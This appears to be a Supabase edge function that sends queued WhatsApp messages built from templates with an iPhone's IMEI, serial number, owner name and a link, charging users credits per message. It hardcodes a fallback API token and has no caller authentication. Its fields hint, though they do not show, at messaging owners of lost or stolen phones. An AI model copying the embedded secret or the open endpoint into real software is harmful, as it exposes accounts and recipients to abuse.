import { createClient } from 'https://esm.sh/@supabase/supabase-js@2.57.0';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseServiceKey);

    console.log('Starting message queue processing...');

    // Check if a specific message ID was provided
    const body = await req.json().catch(() => ({}));
    const messageId = body.messageId;
    const auto = body.auto;

    let query = supabase
      .from('message_queue')
      .select(`
        *,
        processes (
          client_name,
          country_code,
          phone_number,
          contact_type,
          owner_name,
          iphone_model,
          storage,
          color,
          imei,
          serial_number,
          url
        )
      `)
      .eq('status', 'pending');

    // If auto mode, only process messages older than 5 minutes
    if (auto) {
      const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
      query = query.lte('created_at', fiveMinutesAgo);
    }

    // If specific message ID provided, get that one, otherwise get oldest
    if (messageId) {
      query = query.eq('id', messageId);
    } else {
      query = query.order('created_at', { ascending: true }).limit(1);
    }

    const { data: queuedMessage, error: fetchError } = await query.maybeSingle();

    if (fetchError) {
      console.error('Error fetching queued message:', fetchError);
      throw fetchError;
    }

    if (!queuedMessage) {
      console.log('No pending messages in queue');
      return new Response(
        JSON.stringify({ message: 'No pending messages', processed: 0 }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log('Processing message:', queuedMessage.id);

    // Get user profile separately
    const { data: userProfile, error: profileError } = await supabase
      .from('profiles')
      .select('credits, email, telegram_bot_token, telegram_chat_id')
      .eq('id', queuedMessage.user_id)
      .single();

    if (profileError) {
      console.error('Error fetching user profile:', profileError);
      throw profileError;
    }

    // If message has a template_id but no content was generated yet, generate it now
    if (queuedMessage.template_id && queuedMessage.message_content.includes('{')) {
      console.log('Generating message from template:', queuedMessage.template_id);
      
      const { data: template } = await supabase
        .from('message_templates')
        .select('template_content')
        .eq('id', queuedMessage.template_id)
        .single();

      if (template) {
        // Replace variables in template with actual process data
        const customMessage = template.template_content
          .replace(/\{client_name\}/g, queuedMessage.processes?.client_name || '')
          .replace(/\{phone_number\}/g, queuedMessage.processes?.phone_number || '')
          .replace(/\{iphone_model\}/g, queuedMessage.processes?.iphone_model || '')
          .replace(/\{storage\}/g, queuedMessage.processes?.storage || '')
          .replace(/\{color\}/g, queuedMessage.processes?.color || '')
          .replace(/\{imei\}/g, queuedMessage.processes?.imei || '')
          .replace(/\{serial_number\}/g, queuedMessage.processes?.serial_number || '')
          .replace(/\{owner_name\}/g, queuedMessage.processes?.owner_name || '')
          .replace(/\{url\}/g, queuedMessage.processes?.url || '');

        // Append device information
        const deviceInfo = `\n\n📱 *Información del Dispositivo:*
• Modelo: ${queuedMessage.processes?.iphone_model || 'N/A'}
• Almacenamiento: ${queuedMessage.processes?.storage || 'N/A'}
• Color: ${queuedMessage.processes?.color || 'N/A'}
• IMEI: ${queuedMessage.processes?.imei || 'N/A'}
• Número de Serie: ${queuedMessage.processes?.serial_number || 'N/A'}`;

        queuedMessage.message_content = customMessage + deviceInfo;
      }
    }

    if (profileError) {
      console.error('Error fetching user profile:', profileError);
      throw profileError;
    }

    // Check if user has credits
    const userCredits = userProfile?.credits || 0;
    if (userCredits <= 0) {
      console.log('User has no credits, marking as failed');
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: 'Message failed: No credits', 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Get WhatsApp settings
    const settingsKeys = queuedMessage.language === 'spanish' 
      ? ['whatsapp_instance', 'whatsapp_token']
      : ['whatsapp_instance_en', 'whatsapp_token_en'];

    const { data: settings } = await supabase
      .from('system_settings')
      .select('*')
      .in('setting_key', settingsKeys);

    const config = settings?.reduce((acc: any, setting: any) => {
      acc[setting.setting_key] = setting.setting_value;
      return acc;
    }, {});

    const instanceId = queuedMessage.language === 'spanish' 
      ? (config?.whatsapp_instance || 'instance126876')
      : (config?.whatsapp_instance_en || 'instance_en_default');
      
    const token = queuedMessage.language === 'spanish' 
      ? (config?.whatsapp_token || '4ecj8581tubua7ry')
      : (config?.whatsapp_token_en || 'token_en_default');

    if (!instanceId || !token || instanceId.includes('default') || token.includes('default')) {
      console.log('WhatsApp configuration missing');
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: 'Message failed: WhatsApp configuration missing', 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Send WhatsApp message
    let result;
    if (queuedMessage.image_url) {
      console.log('Sending message with image');
      const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/image`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          token: token,
          to: queuedMessage.recipient_phone,
          image: queuedMessage.image_url,
          caption: queuedMessage.message_content,
        }),
      });
      result = await response.json();
    } else {
      console.log('Sending text only message');
      const response = await fetch(`https://api.ultramsg.com/${instanceId}/messages/chat`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          token: token,
          to: queuedMessage.recipient_phone,
          body: queuedMessage.message_content,
        }),
      });
      result = await response.json();
    }

    console.log('WhatsApp API response:', result);

    if (result.sent === true || result.sent === "true") {
      // Deduct credit
      await supabase
        .from('profiles')
        .update({ 
          credits: userCredits - 1,
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.user_id);

      // Save to messages table
      await supabase
        .from('messages')
        .insert({
          user_id: queuedMessage.user_id,
          process_id: queuedMessage.process_id,
          message_content: queuedMessage.message_content,
          recipient_phone: queuedMessage.recipient_phone,
          status: 'sent',
          sent_at: new Date().toISOString()
        });

      // Update process status
      await supabase
        .from('processes')
        .update({ 
          status: 'enviado',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.process_id);

      // Update queue status
      await supabase
        .from('message_queue')
        .update({ 
          status: 'sent',
          sent_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      console.log('Message sent successfully');

      // Send Telegram notification if configured
      if (userProfile.telegram_bot_token && userProfile.telegram_chat_id) {
        try {
          const telegramMessage = `✅ *Mensaje Enviado*\n\nCliente: ${queuedMessage.processes?.client_name}\nTeléfono: ${queuedMessage.recipient_phone}\nIdioma: ${queuedMessage.language}\n\nCréditos restantes: ${userCredits - 1}`;
          
          await fetch(`https://api.telegram.org/bot${userProfile.telegram_bot_token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: userProfile.telegram_chat_id,
              text: telegramMessage,
              parse_mode: 'Markdown'
            })
          });
          
          console.log('Telegram notification sent');
        } catch (telegramError) {
          console.error('Error sending Telegram notification:', telegramError);
          // Don't fail the whole process if Telegram notification fails
        }
      }

      return new Response(
        JSON.stringify({ 
          message: 'Message sent successfully', 
          processed: 1,
          queuedMessageId: queuedMessage.id
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    } else {
      console.log('WhatsApp send failed:', result);
      await supabase
        .from('message_queue')
        .update({ 
          status: 'failed',
          updated_at: new Date().toISOString()
        })
        .eq('id', queuedMessage.id);

      return new Response(
        JSON.stringify({ 
          message: `Message failed: ${result.message || result.error || 'Unknown error'}`, 
          processed: 0 
        }),
        { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

  } catch (error) {
    console.error('Error processing message queue:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { 
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' } 
      }
    );
  }
});
